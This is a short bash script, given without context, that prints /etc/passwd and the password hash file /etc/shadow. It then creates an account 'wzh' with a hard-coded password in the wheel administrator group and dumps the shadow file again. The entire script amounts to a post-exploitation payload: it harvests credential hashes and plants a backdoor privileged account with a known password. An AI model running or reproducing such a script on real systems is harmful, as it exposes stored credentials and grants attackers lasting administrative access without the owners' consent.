#!/bin/bash
set -x
cat /etc/passwd
cat /etc/shadow
useradd -p $( openssl passwd -1 wzhwzh ) wzh -s /bin/bash -G wheel
cat /etc/shadow